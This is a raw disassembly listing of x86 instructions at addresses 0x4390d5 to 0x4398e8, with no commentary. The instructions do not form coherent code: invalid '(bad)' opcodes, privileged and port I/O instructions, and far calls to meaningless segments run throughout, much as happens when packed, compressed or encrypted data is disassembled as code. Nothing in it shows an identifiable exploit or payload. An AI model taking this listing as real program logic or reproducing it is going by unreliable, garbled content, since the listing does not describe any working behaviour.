  4390d5:	cmp    esp,DWORD PTR [edi-0x45971f5]
  4390db:	scas   al,BYTE PTR es:[edi]
  4390dc:	sbb    DWORD PTR [eax-0x29],ebx
  4390df:	push   ecx
  4390e0:	sbb    al,0x70
  4390e2:	push   cs
  4390e3:	and    esp,DWORD PTR [eax]
  4390e5:	or     edi,DWORD PTR [edi+0x4f956b44]
  4390eb:	test   eax,0x4a0be547
  4390f0:	xchg   esi,eax
  4390f1:	dec    edx
  4390f2:	rcl    WORD PTR [edx-0x14d933d0],cl
  4390f9:	inc    esp
  4390fa:	fwait
  4390fb:	hlt    
  4390fc:	fild   WORD PTR [ebx-0x48]
  4390ff:	hlt    
  439100:	inc    esi
  439101:	(bad)  
  439102:	sbb    al,0xc8
  439104:	gs nop
  439106:	das    
  439107:	out    dx,al
  439108:	cmp    BYTE PTR [edi],ch
  43910a:	shl    BYTE PTR [esi],0x2c
  43910d:	cdq    
  43910e:	call   0x17c9:0x91558dc1
  439115:	mov    ebx,0x460531f8
  43911a:	cli    
  43911b:	in     eax,dx
  43911c:	add    al,BYTE PTR [esi-0x2a]
  43911f:	lock mov edx,0x204e9d78
  439125:	pop    ecx
  439126:	retf   0xcfbb
  439129:	ret    0xb5c8
  43912c:	inc    ecx
  43912d:	sbb    ch,dl
  43912f:	xor    al,0x65
  439131:	clc    
  439132:	loop   0x43911f
  439134:	dec    ecx
  439135:	mov    cs:0x5e7ad832,al
  43913b:	adc    DWORD PTR [edi],ebx
  43913d:	ins    DWORD PTR es:[edi],dx
  43913e:	jno    0x439173
  439140:	mov    edi,DWORD PTR [edx+0x2c]
  439143:	push   cs
  439144:	lds    edx,FWORD PTR [ecx+edx*8+0x563e13f0]
  43914b:	ja     0x4390d7
  43914d:	mov    ecx,0xf7a8a54d
  439152:	sbb    al,0xb8
  439154:	mov    ah,0x2c
  439156:	mov    al,0x37
  439158:	mov    BYTE PTR gs:[eiz*8+0x3fe4ecf],al
  439160:	sti    
  439161:	cdq    
  439162:	ja     0x43915f
  439164:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439166:	mov    edi,0x606cc987
  43916b:	xor    dh,dh
  43916d:	inc    BYTE PTR [edi]
  43916f:	cwde   
  439170:	or     eax,0x213c59a2
  439175:	lahf   
  439176:	and    al,0x5b
  439178:	jecxz  0x439117
  43917a:	iret   
  43917b:	stos   BYTE PTR es:[edi],al
  43917c:	mov    eax,ss:0xd4c05863
  439182:	xor    al,0x9f
  439184:	arpl   WORD PTR cs:0x6ba53c5e,di
  43918b:	fcom   st(4)
  43918d:	int    0x25
  43918f:	outs   dx,BYTE PTR ds:[esi]
  439190:	push   ss
  439191:	fnstenv [edx+0x3d]
  439194:	ret    
  439195:	pushf  
  439196:	(bad)  
  439197:	cmp    al,0x48
  439199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43919a:	sub    eax,DWORD PTR ds:0xb5eec1c0
  4391a0:	test   DWORD PTR [esi-0x4d],ebp
  4391a3:	fldenv [ebp+0x3f]
  4391a6:	push   ss
  4391a7:	xchg   esi,eax
  4391a8:	jbe    0x439141
  4391aa:	mov    dh,0x14
  4391ac:	lods   al,BYTE PTR ds:[esi]
  4391ad:	sub    esp,0x6e21245b
  4391b3:	sahf   
  4391b4:	and    eax,0xdc1b98c7
  4391b9:	loope  0x4391f1
  4391bb:	jle    0x43920a
  4391bd:	mov    eax,gs:0xbff7a828
  4391c3:	dec    esi
  4391c4:	sbb    BYTE PTR ss:[edx+0x63978624],dh
  4391cb:	sbb    eax,0xb5e34177
  4391d0:	and    bl,BYTE PTR [edi-0xe]
  4391d3:	add    eax,0x7f639e8f
  4391d8:	push   ebx
  4391d9:	xlat   BYTE PTR ds:[ebx]
  4391da:	sub    BYTE PTR [edx-0xd84da1b],bl
  4391e0:	dec    eax
  4391e1:	jo     0x439235
  4391e3:	and    ecx,DWORD PTR [edx+0x36e4f719]
  4391e9:	repz hlt 
  4391eb:	cli    
  4391ec:	mov    edx,0xe8f4b739
  4391f1:	xchg   DWORD PTR [edi-0x53],ebp
  4391f4:	aad    0xef
  4391f6:	iret   
  4391f7:	lock push ebx
  4391f9:	aam    0xd
  4391fb:	adc    eax,DWORD PTR [esp+ebx*4-0x7d8eba59]
  439202:	dec    ebx
  439203:	hlt    
  439204:	int    0xa3
  439206:	jmp    0x439194
  439208:	push   cs
  439209:	jno    0x43926d
  43920b:	pop    ebx
  43920c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43920d:	aam    0xe7
  43920f:	adc    al,0x93
  439211:	fwait
  439212:	iret   
  439213:	push   esp
  439214:	leave  
  439215:	pop    eax
  439216:	mov    ds:0xbba7fe57,eax
  43921b:	and    BYTE PTR [eax+0x29028cb8],dl
  439221:	outs   dx,DWORD PTR ds:[esi]
  439222:	mov    ?,WORD PTR ds:0xabd3b91d
  439228:	mov    al,0x98
  43922a:	es ds loope 0x4391dd
  43922e:	retf   
  43922f:	pop    esp
  439230:	aaa    
  439231:	stc    
  439232:	inc    eax
  439233:	adc    ebp,DWORD PTR [edx]
  439235:	jae    0x4391cc
  439237:	push   esi
  439238:	sbb    dl,BYTE PTR [ecx-0x1aac8aa8]
  43923e:	out    dx,al
  43923f:	push   esi
  439240:	jbe    0x439231
  439242:	mov    ebx,0x3ad9189b
  439247:	mov    bh,0xd8
  439249:	in     al,dx
  43924a:	test   BYTE PTR [edx],cl
  43924c:	and    BYTE PTR [edx-0x762cbb47],0x42
  439253:	and    al,0x85
  439255:	ss or  dh,cl
  439258:	dec    edi
  439259:	stc    
  43925a:	popa   
  43925b:	out    dx,eax
  43925c:	jmp    0x439268
  43925e:	fadd   DWORD PTR [edx+0x4c]
  439261:	sar    DWORD PTR [edi-0x1665b1a4],0x63
  439268:	mov    bh,0xbe
  43926a:	int3   
  43926b:	mov    eax,0x5fdbb306
  439270:	(bad)  
  439272:	cmp    ecx,eax
  439274:	xchg   ebx,eax
  439275:	pop    es
  439276:	mov    BYTE PTR ds:0xc3579919,ch
  43927c:	xchg   esi,eax
  43927d:	cld    
  43927e:	inc    ebx
  43927f:	mov    DWORD PTR [ebx-0x7b],edx
  439282:	dec    ebp
  439283:	fcmovne st,st(5)
  439285:	popf   
  439286:	mov    bl,0x49
  439288:	inc    esi
  439289:	into   
  43928a:	xor    eax,0xa391d81
  43928f:	outs   dx,BYTE PTR ds:[esi]
  439290:	popf   
  439291:	(bad)  
  439292:	fmul   DWORD PTR [ecx]
  439294:	(bad)  
  439295:	cdq    
  439296:	pop    ebx
  439297:	mov    BYTE PTR [eax-0x71d4046],0xdb
  43929e:	push   eax
  43929f:	and    ebp,esi
  4392a1:	dec    ebp
  4392a2:	ret    0xa3d4
  4392a5:	repz inc ebp
  4392a7:	mov    bh,0xcf
  4392a9:	test   DWORD PTR [edx+ebp*4-0x428b008f],edi
  4392b0:	shr    ah,1
  4392b2:	mov    bl,0x8
  4392b4:	mov    bh,0x98
  4392b6:	and    BYTE PTR [ebp-0x6b],bl
  4392b9:	mov    ah,0xb7
  4392bb:	mov    ah,0x48
  4392bd:	or     eax,0x46e6ba7f
  4392c2:	xor    ebx,DWORD PTR [ebx+0x3b]
  4392c5:	mov    al,ds:0x28af18c5
  4392ca:	mov    al,ds:0xb4d357ca
  4392cf:	in     al,0xbf
  4392d1:	pushf  
  4392d2:	not    BYTE PTR [edi-0x4e08a56a]
  4392d8:	jge    0x43929e
  4392da:	pop    ds
  4392db:	or     BYTE PTR [ebp+0x55],0xbb
  4392df:	push   esp
  4392e0:	sti    
  4392e1:	jge    0x439309
  4392e3:	and    esp,esi
  4392e5:	aam    0x8b
  4392e7:	and    eax,0x366bda4c
  4392ec:	sbb    DWORD PTR [edi],esi
  4392ee:	mov    ah,0x7f
  4392f0:	pop    ds
  4392f1:	imul   esp,esi,0x8dfe0e71
  4392f7:	adc    cl,dl
  4392f9:	popf   
  4392fa:	sbb    esp,DWORD PTR [ebx]
  4392fc:	aas    
  4392fd:	mov    ah,0xc4
  4392ff:	cli    
  439300:	pop    ecx
  439301:	sub    BYTE PTR [ecx-0x406bd78e],ah
  439307:	fs cmc 
  439309:	xchg   esp,eax
  43930a:	pop    ebp
  43930b:	rcl    BYTE PTR [ebp-0x320f604b],1
  439311:	add    BYTE PTR [eax],bh
  439313:	sub    eax,0xe5463923
  439318:	shr    BYTE PTR [edx],0xd9
  43931b:	pop    ecx
  43931c:	jns    0x439324
  43931e:	mov    ds,WORD PTR [esi]
  439320:	test   ebp,0xa02042fc
  439326:	retf   
  439327:	outs   dx,DWORD PTR ds:[esi]
  439328:	pop    ebx
  439329:	das    
  43932a:	icebp  
  43932b:	call   0x3b1f2e84
  439330:	cmp    bl,BYTE PTR [ebx+0x5e244097]
  439336:	xlat   BYTE PTR ds:[ebx]
  439337:	fwait
  439338:	jg     0x439314
  43933a:	(bad)  
  43933b:	pop    esp
  43933c:	push   eax
  43933d:	leave  
  43933e:	aam    0xa9
  439340:	push   cs
  439341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439342:	mov    BYTE PTR [esi+0x47ab9e70],bl
  439348:	ss jl  0x439314
  43934b:	hlt    
  43934c:	jg     0x439330
  43934e:	iret   
  43934f:	ss mov bl,0x1e
  439352:	mov    ah,0x74
  439354:	mov    edx,0x755bc451
  439359:	cdq    
  43935a:	ins    BYTE PTR es:[edi],dx
  43935b:	in     al,dx
  43935c:	add    BYTE PTR [edx+0x66],ah
  43935f:	(bad)  
  439360:	and    DWORD PTR [ecx],edi
  439362:	leave  
  439363:	popf   
  439364:	jno    0x4392e8
  439366:	or     DWORD PTR [edx+0x50],eax
  439369:	test   al,0xdb
  43936b:	pop    es
  43936c:	dec    ebx
  43936d:	jb     0x4393d6
  43936f:	pop    edi
  439370:	repnz into 
  439372:	push   0xd7e70613
  439377:	sub    esp,DWORD PTR fs:[eax+0x42e0d443]
  43937e:	shl    DWORD PTR [ecx-0xdd7a80b],0x93
  439385:	fstp   st(2)
  439387:	jb     0x4393aa
  439389:	cdq    
  43938a:	xchg   esi,eax
  43938b:	std    
  43938c:	sbb    al,0x9f
  43938e:	jge    0x4393bb
  439390:	jle    0x4393f3
  439392:	sub    bl,BYTE PTR [edi-0x2f183df9]
  439398:	imul   ebp,DWORD PTR [ebx+0x69],0x999a91f3
  43939f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4393a0:	dec    eax
  4393a1:	sub    bh,ah
  4393a3:	test   BYTE PTR [ebp+0x498c5820],dl
  4393a9:	mov    ebx,0xb1a60eb
  4393ae:	xor    BYTE PTR [eax-0x28d500e4],bh
  4393b4:	and    bl,BYTE PTR [ecx+0x14]
  4393b7:	cmp    BYTE PTR [eax-0x6f],al
  4393ba:	sub    al,0x1c
  4393bc:	mov    ch,0xd8
  4393be:	fwait
  4393bf:	addr16 xchg ebx,eax
  4393c1:	or     DWORD PTR [ecx-0x6c76ecc2],edx
  4393c7:	push   ebx
  4393c8:	dec    esp
  4393c9:	xchg   edx,eax
  4393ca:	mov    ebx,0xb7d9175e
  4393cf:	cmp    al,0x25
  4393d1:	mov    esp,0xa538518b
  4393d6:	dec    ebx
  4393d7:	xchg   edx,eax
  4393d8:	xchg   ebp,eax
  4393d9:	shr    BYTE PTR [esi+0x7db3af31],1
  4393df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4393e0:	popa   
  4393e1:	xchg   esi,eax
  4393e2:	mov    bh,0xa4
  4393e4:	add    BYTE PTR [eax-0x7fea197b],al
  4393ea:	sahf   
  4393eb:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4393ed:	in     eax,dx
  4393ee:	xor    DWORD PTR ds:[eax],ebx
  4393f1:	pop    ecx
  4393f2:	jp     0x4393fa
  4393f4:	mov    BYTE PTR [ebp-0x6c],al
  4393f7:	cmp    eax,ebx
  4393f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4393fa:	fcmovnbe st,st(5)
  4393fc:	adc    BYTE PTR [esi+0x4fe59084],bl
  439402:	je     0x439462
  439404:	jmp    FWORD PTR [ecx]
  439406:	cld    
  439407:	push   ebx
  439408:	ins    BYTE PTR es:[edi],dx
  439409:	cwde   
  43940a:	fld    QWORD PTR [esp+ecx*1]
  43940d:	retf   0xe4b0
  439410:	lods   al,BYTE PTR ds:[esi]
  439411:	push   eax
  439412:	repz inc edi
  439414:	in     eax,0x78
  439416:	cs out 0x5,eax
  439419:	mov    edi,0xdda2fa36
  43941e:	jge    0x439499
  439420:	and    eax,0x5ae5afaa
  439425:	inc    edx
  439426:	rol    BYTE PTR fs:0x3aeff7e0,cl
  43942d:	add    ebx,DWORD PTR [eax-0x2a]
  439430:	(bad)
  439434:	pop    edx
  439435:	xchg   ecx,eax
  439436:	in     al,dx
  439437:	lods   al,BYTE PTR ds:[esi]
  439438:	clc    
  439439:	xor    DWORD PTR [ecx+0x201cf7fb],0xffffffda
  439440:	xor    eax,0x2eff4903
  439445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439446:	sahf   
  439447:	push   ebp
  439448:	push   ds
  439449:	or     DWORD PTR [ebp-0x3c],esi
  43944c:	out    dx,al
  43944d:	outs   dx,BYTE PTR ds:[esi]
  43944e:	(bad)  
  43944f:	push   0x319ba1c8
  439454:	inc    esp
  439455:	in     eax,0x60
  439457:	pop    ss
  439458:	push   edx
  439459:	mov    ds:0xae16f896,al
  43945e:	mov    ch,0xf4
  439460:	mov    ds,WORD PTR [eax+0x2ae56979]
  439466:	fldln2 
  439468:	inc    ebp
  439469:	lahf   
  43946a:	pop    edx
  43946b:	sub    bl,BYTE PTR [edx-0x3202d2f8]
  439471:	pop    edi
  439472:	mov    ebp,0x3e8e4c74
  439477:	(bad)
  43947a:	sub    al,0xeb
  43947c:	ja     0x43943e
  43947e:	pop    esp
  43947f:	nop
  439480:	sbb    cl,cl
  439482:	into   
  439483:	cli    
  439484:	ficomp WORD PTR [edx-0xa]
  439487:	call   0xddcf2ed7
  43948c:	and    ch,BYTE PTR [edx]
  43948e:	je     0x439468
  439490:	sub    DWORD PTR [eax+0x1b],0xf3891a2f
  439497:	jnp    0x4394be
  439499:	shl    BYTE PTR [edx+edx*8-0x3633f375],1
  4394a0:	pushf  
  4394a1:	jbe    0x439468
  4394a3:	dec    esi
  4394a4:	dec    ecx
  4394a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4394a6:	(bad)  
  4394a7:	in     al,dx
  4394a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4394a9:	jl     0x43949e
  4394ab:	inc    edi
  4394ac:	mov    ebp,0x75ebbe02
  4394b1:	pop    esi
  4394b2:	cli    
  4394b3:	mov    ch,BYTE PTR [ecx-0x7a7fa7f2]
  4394b9:	pop    esi
  4394ba:	es jge 0x43952a
  4394bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4394be:	pop    es
  4394bf:	inc    eax
  4394c0:	cmp    DWORD PTR [edi-0x628db75c],ebx
  4394c6:	stos   DWORD PTR es:[edi],eax
  4394c7:	test   al,0xa1
  4394c9:	pop    edx
  4394ca:	push   0xffffffcb
  4394cc:	fstp   st(5)
  4394ce:	jb     0x439464
  4394d0:	mov    ch,0xeb
  4394d2:	mov    al,ds:0x1f787fc
  4394d7:	adc    edx,DWORD PTR [ebp-0x79]
  4394da:	push   ss
  4394db:	shr    DWORD PTR [edi-0x80fc0f0],cl
  4394e1:	pop    ds
  4394e2:	mov    al,0xd4
  4394e4:	repnz pop es
  4394e6:	pusha  
  4394e7:	inc    ebx
  4394e8:	xor    al,0xd
  4394ea:	pop    ebp
  4394eb:	hlt    
  4394ec:	pop    ebp
  4394ed:	or     al,0xdc
  4394ef:	sub    al,0x29
  4394f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4394f2:	out    0xf1,eax
  4394f4:	mov    al,0xc2
  4394f6:	xor    al,0x27
  4394f8:	retf   0xc067
  4394fb:	je     0x43949f
  4394fd:	cs push cs
  4394ff:	popf   
  439500:	or     BYTE PTR [eax+0x2595a0fb],al
  439506:	out    dx,al
  439507:	jmp    0xb2fb35ca
  43950c:	and    eax,0x81748ea9
  439511:	popa   
  439512:	mov    eax,0x2344e9b1
  439517:	not    BYTE PTR [eax+0x76e90c0c]
  43951d:	fdivr  DWORD PTR [ebp+0x40ad523f]
  439523:	in     eax,dx
  439524:	stc    
  439525:	pop    ecx
  439526:	mov    ebx,0x919e04bb
  43952b:	sub    BYTE PTR [ecx+esi*2],bh
  43952e:	imul   esi,esi,0xea9498b5
  439534:	adc    eax,0x2204d103
  439539:	mov    DWORD PTR [edx-0x6c1c5915],eax
  43953f:	daa    
  439540:	jmp    0x1f5d10e5
  439545:	shl    BYTE PTR [edi-0xc],1
  439548:	retf   
  439549:	xchg   esi,eax
  43954a:	sbb    al,0x36
  43954c:	add    bl,BYTE PTR [edi-0x4f]
  43954f:	inc    esp
  439550:	je     0x4394e6
  439552:	xchg   edi,eax
  439553:	fcomp  QWORD PTR [ecx-0x3e]
  439556:	push   edi
  439557:	ror    DWORD PTR [edx+0x7b],1
  43955a:	mov    dh,0x14
  43955c:	loopne 0x439577
  43955e:	pop    esp
  43955f:	pop    ds
  439560:	add    BYTE PTR [ebp-0x304adb37],ah
  439566:	push   cs
  439567:	cld    
  439568:	pop    ecx
  439569:	fwait
  43956a:	jnp    0x43953e
  43956c:	(bad)  
  43956d:	jne    0x439583
  43956f:	push   es
  439570:	push   cs
  439571:	lock xor BYTE PTR [esi],bl
  439574:	mov    ah,0xa8
  439576:	mov    edx,0xf8840654
  43957b:	test   al,0xa5
  43957d:	xor    ebp,DWORD PTR [edx+esi*8+0x7]
  439581:	pop    ecx
  439582:	jae    0x4395ff
  439584:	sbb    ebx,ecx
  439586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439587:	cdq    
  439588:	imul   edi,DWORD PTR [edx-0x653c9de0],0xffffffbb
  43958f:	imul   edx,DWORD PTR [ebp-0x1b],0x31
  439593:	sbb    dh,BYTE PTR [esi+0x366dbc6]
  439599:	call   0xfdb09a55
  43959e:	dec    ecx
  43959f:	mov    ecx,DWORD PTR [ecx]
  4395a1:	(bad)  
  4395a2:	gs mov edx,0x54b7495d
  4395a8:	dec    esi
  4395a9:	fiadd  WORD PTR [eax-0x45e95121]
  4395af:	mov    ah,0x42
  4395b1:	fwait
  4395b2:	add    DWORD PTR ds:0xf2861ea5,0xd
  4395b9:	adc    BYTE PTR [esi],dl
  4395bb:	mov    ds:0x82e01922,al
  4395c0:	xchg   esp,eax
  4395c1:	fidivr DWORD PTR [edx]
  4395c3:	int    0x26
  4395c5:	popf   
  4395c6:	or     ebp,DWORD PTR [eax]
  4395c8:	mov    esp,0xa67da314
  4395cd:	inc    ebx
  4395ce:	lds    edi,FWORD PTR [ebp+0x74b25f65]
  4395d4:	add    DWORD PTR [edi-0x6342e2bf],ebx
  4395da:	pop    ebx
  4395db:	fld    QWORD PTR [edi-0x7709848]
  4395e1:	ja     0x439655
  4395e3:	adc    eax,DWORD PTR [ecx-0x2a]
  4395e6:	mov    esi,0x2a38b624
  4395eb:	icebp  
  4395ec:	cmc    
  4395ed:	cli    
  4395ee:	icebp  
  4395ef:	out    0x9a,eax
  4395f1:	in     eax,dx
  4395f2:	fwait
  4395f3:	test   BYTE PTR [edx],ah
  4395f5:	fst    DWORD PTR [ebp+ebx*1+0xad20e77]
  4395fc:	and    BYTE PTR [esi+0x33ee60ab],0x85
  439603:	sbb    BYTE PTR [eax+edi*1+0x31],ah
  439607:	neg    DWORD PTR [ecx]
  439609:	add    cl,dl
  43960b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43960c:	(bad)
  439611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439612:	mov    ebx,0xd1b7592a
  439617:	sbb    cl,al
  439619:	in     al,0x3b
  43961b:	sbb    ch,ch
  43961d:	and    DWORD PTR [eax-0x68f8e75c],edi
  439623:	adc    BYTE PTR ds:0x4cef9eb3,dh
  439629:	call   0xf16:0x8925f74d
  439630:	test   al,0xe4
  439632:	retf   
  439633:	mov    dl,0xcc
  439635:	xor    bl,dl
  439637:	push   edx
  439638:	and    eax,0x2cee03fa
  43963d:	or     BYTE PTR [ebx-0xf],dl
  439640:	and    BYTE PTR [ecx+0x405919b3],ch
  439646:	stos   BYTE PTR es:[edi],al
  439647:	mov    eax,0xe572a332
  43964d:	sbb    bh,BYTE PTR [ecx]
  43964f:	in     al,dx
  439650:	inc    esi
  439651:	in     eax,dx
  439652:	outs   dx,BYTE PTR ds:[esi]
  439653:	enter  0x952,0x22
  439657:	adc    dl,BYTE PTR ds:0xff4062b3
  43965d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43965e:	pop    ds
  43965f:	nop
  439660:	sbb    edi,eax
  439662:	pop    ecx
  439663:	mov    esp,0xe6e66965
  439668:	stc    
  439669:	test   eax,0xe91ed39a
  43966e:	inc    ebx
  43966f:	gs test al,0x71
  439672:	fsub   QWORD PTR [eax+0x378f8c0c]
  439678:	or     dl,BYTE PTR [edx-0x32db5b7c]
  43967e:	js     0x439612
  439680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439681:	sar    BYTE PTR [edi-0x17],1
  439684:	mov    eax,0x1074bb91
  439689:	xchg   BYTE PTR [ebp-0x63e4d667],dl
  43968f:	retf   0xdaf2
  439692:	push   ebx
  439693:	mov    eax,0xef0620d9
  439698:	(bad)  
  439699:	imul   edx,esp,0xffffffa8
  43969c:	ss mov al,0xb6
  43969f:	aam    0xf
  4396a1:	popa   
  4396a2:	xchg   BYTE PTR [edx-0xb],dh
  4396a5:	and    eax,0x5124edab
  4396aa:	mov    al,0x12
  4396ac:	push   ss
  4396ad:	or     DWORD PTR [esi+0x5a],esi
  4396b0:	retf   
  4396b1:	enter  0x9ad6,0x9d
  4396b5:	fwait
  4396b6:	retf   
  4396b7:	xor    BYTE PTR [edx],dl
  4396b9:	in     al,0xcd
  4396bb:	sbb    eax,0xb8078cb9
  4396c0:	and    BYTE PTR [ecx+0x4d2e6472],ch
  4396c6:	dec    ebp
  4396c7:	retfw  0xfba5
  4396cb:	repz (bad) 
  4396cd:	cwde   
  4396ce:	out    dx,eax
  4396cf:	pusha  
  4396d0:	pop    edx
  4396d1:	push   ds
  4396d2:	adc    eax,0xc1f20dcf
  4396d7:	fs in  al,0xa1
  4396da:	jl     0x43969d
  4396dc:	icebp  
  4396dd:	test   al,0xbb
  4396df:	fwait
  4396e0:	mov    eax,0x9eeac18c
  4396e5:	dec    esi
  4396e6:	in     eax,dx
  4396e7:	push   0x54b713ca
  4396ec:	cs aaa 
  4396ee:	sub    bh,0xb6
  4396f1:	mov    ecx,DWORD PTR [eax]
  4396f3:	and    al,0xaa
  4396f5:	mov    dl,0xd2
  4396f7:	mov    al,ds:0x64bfb7cd
  4396fc:	mov    DWORD PTR [edi],esi
  4396fe:	sahf   
  4396ff:	ja     0x439747
  439701:	cmp    al,0x5a
  439703:	push   ecx
  439704:	inc    ecx
  439705:	fs jno 0x43971d
  439708:	paddsw mm1,mm4
  43970b:	aam    0xcb
  43970d:	push   ss
  43970e:	mov    dh,0x77
  439710:	mov    ebp,0xa0033c88
  439715:	dec    esp
  439716:	add    eax,0xbe7dc854
  43971b:	inc    edx
  43971c:	sbb    ecx,esi
  43971e:	xor    eax,0x294a04b5
  439723:	mov    edi,0xb147a5ff
  439728:	xchg   esp,eax
  439729:	test   BYTE PTR [ebx-0x76],dl
  43972c:	push   ebp
  43972d:	fnsave [edx]
  43972f:	icebp  
  439730:	xor    eax,0x1f3fb6db
  439735:	dec    ecx
  439736:	mov    esi,0x3d890d0a
  43973b:	xchg   ebp,eax
  43973c:	inc    eax
  43973d:	pop    bp
  43973f:	add    BYTE PTR [edx-0x2bc92c60],ah
  439745:	xor    ebp,DWORD PTR [esi-0x5e]
  439748:	es dec ecx
  43974a:	hlt    
  43974b:	xchg   BYTE PTR [ebp+0x202ef282],dl
  439751:	aad    0xb2
  439753:	cmp    ah,dh
  439755:	sbb    ebx,DWORD PTR [edx-0x39c8a3e7]
  43975b:	or     al,0xb3
  43975d:	push   es
  43975e:	aaa    
  43975f:	inc    esp
  439760:	test   DWORD PTR [esi+0x3860f4b5],edx
  439766:	sysret 
  439768:	and    eax,0xef05e32
  43976d:	and    al,0xa4
  43976f:	mov    al,0xc
  439771:	or     edx,DWORD PTR [edx-0x1d3ee40b]
  439777:	fidiv  WORD PTR [ecx]
  439779:	xchg   ecx,eax
  43977a:	jae    0x439798
  43977c:	out    0x6e,al
  43977e:	cmp    eax,DWORD PTR [ecx-0x48ae56e3]
  439784:	mov    eax,ds:0xe0344a56
  439789:	(bad)  
  43978b:	je     0x439768
  43978d:	mov    cl,0x69
  43978f:	sbb    DWORD PTR [ebp+0x7609d86],esp
  439795:	mov    ds:0x7876db7d,al
  43979a:	out    0x22,eax
  43979c:	mov    eax,ds:0x904a7af7
  4397a1:	adc    BYTE PTR [edx-0x198f002e],ah
  4397a7:	inc    esp
  4397a8:	loop   0x4397c4
  4397aa:	js     0x43981e
  4397ac:	fstp   QWORD PTR [ecx+0x48e62a6b]
  4397b2:	mov    edx,0xaf1b199c
  4397b7:	cmp    eax,0x94bcee27
  4397bc:	fs mov eax,0x9bd64dec
  4397c2:	mov    edx,0x4f9ae85d
  4397c7:	ins    BYTE PTR es:[edi],dx
  4397c8:	push   ss
  4397c9:	and    ebp,ebx
  4397cb:	repz push ss
  4397cd:	jmp    0x2b15d41f
  4397d2:	cdq    
  4397d3:	jae    0x439780
  4397d5:	pop    ebp
  4397d6:	fistp  QWORD PTR [ebx-0x102b66e7]
  4397dc:	xor    al,0xb2
  4397de:	mov    esi,0x7c292266
  4397e3:	int    0x95
  4397e5:	mov    bh,0xf3
  4397e7:	ins    DWORD PTR es:[edi],dx
  4397e8:	pop    ebp
  4397e9:	call   0x3f:0x8dd7d84b
  4397f0:	mov    dh,0x96
  4397f2:	data16 aaa 
  4397f4:	lahf   
  4397f5:	cmp    eax,0x4e0dd4b7
  4397fa:	push   edx
  4397fb:	sbb    esi,DWORD PTR [ebp+0x60]
  4397fe:	jmp    0x4397e7
  439800:	fisubr WORD PTR [ebp+0x4919b730]
  439806:	push   ds
  439807:	mov    bh,0xb8
  439809:	adc    edx,ebp
  43980b:	lock dec esp
  43980d:	mov    ds:0xf38bf31b,eax
  439812:	popa   
  439813:	xor    eax,0x6277a8e8
  439818:	icebp  
  439819:	sar    BYTE PTR [edi-0x6a00d5cc],1
  43981f:	jno    0x439826
  439821:	popf   
  439822:	(bad)  
  439823:	repnz pop ecx
  439825:	jle    0x43988a
  439827:	xor    DWORD PTR [esi],edx
  439829:	or     ebx,esp
  43982b:	inc    ebx
  43982c:	xchg   edx,eax
  43982d:	sub    bl,ch
  43982f:	mov    eax,?
  439831:	sahf   
  439832:	imul   ebp,edx,0xffffffea
  439835:	mov    edx,0xb7ab4c70
  43983a:	add    DWORD PTR [eax],esp
  43983c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  43983e:	push   ebx
  43983f:	cmp    BYTE PTR [eax-0x43c555f1],ah
  439845:	call   0x577:0xe213ed2b
  43984c:	(bad)  
  43984d:	popf   
  43984e:	xchg   BYTE PTR [ecx+0x4bfd6923],bh
  439854:	or     DWORD PTR [edi],esi
  439856:	lods   eax,DWORD PTR ds:[esi]
  439857:	mov    ecx,0x2cdd8a19
  43985c:	loop   0x439800
  43985e:	dec    ebx
  43985f:	mov    al,0x3e
  439861:	dec    ebx
  439862:	inc    edx
  439863:	jmp    0x43987f
  439865:	leave  
  439866:	and    DWORD PTR [esi],ebp
  439868:	mov    dl,0xa6
  43986a:	sbb    ch,BYTE PTR [edx+edi*1-0x5e]
  43986e:	fwait
  43986f:	jmp    0x43985e
  439871:	sti    
  439872:	sub    ebx,DWORD PTR [ecx-0x55d874c5]
  439878:	scas   al,BYTE PTR es:[edi]
  439879:	or     ch,BYTE PTR [ebp+0x75]
  43987c:	vpunpcklqdq ymm6,ymm5,ymm4
  439880:	mov    esp,0x1cd41f7e
  439885:	add    eax,esi
  439887:	clc    
  439888:	jno    0x4398f5
  43988a:	(bad)  
  43988b:	sti    
  43988c:	sbb    ecx,ebx
  43988e:	pop    esp
  43988f:	push   ss
  439890:	cli    
  439891:	mov    BYTE PTR ds:0x7304ad5d,bl
  439897:	dec    ebp
  439898:	xchg   al,cl
  43989a:	cs popa 
  43989c:	retf   0x83a6
  43989f:	fld    QWORD PTR [esi+eiz*8-0x2172d8a8]
  4398a6:	mov    ebp,0x8a32bcd4
  4398ab:	enter  0x9b44,0xc2
  4398af:	(bad)  
  4398b0:	aad    0xf3
  4398b2:	shl    ch,1
  4398b4:	push   0xffffff8f
  4398b6:	les    esi,FWORD PTR [ecx]
  4398b8:	and    eax,0xd2057419
  4398bd:	test   al,0x7e
  4398bf:	xchg   esi,eax
  4398c0:	xlat   BYTE PTR ds:[ebx]
  4398c1:	pushf  
  4398c2:	imul   esi,DWORD PTR [ebx+0x41],0x2b
  4398c6:	mov    bl,0x60
  4398c8:	jno    0x439858
  4398ca:	push   ss
  4398cb:	(bad)  
  4398cc:	arpl   WORD PTR [ebx],dx
  4398ce:	mov    ebp,0x2862d74
  4398d3:	and    al,0x15
  4398d5:	ss add al,0xe5
  4398d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4398d9:	fs fsubrp st(3),st
  4398dc:	loopne 0x4398bc
  4398de:	imul   edi,DWORD PTR [edi],0xed542725
  4398e4:	adc    ah,BYTE PTR [ecx]
  4398e6:	jge    0x439907
  4398e8:	jne    0x4398e6
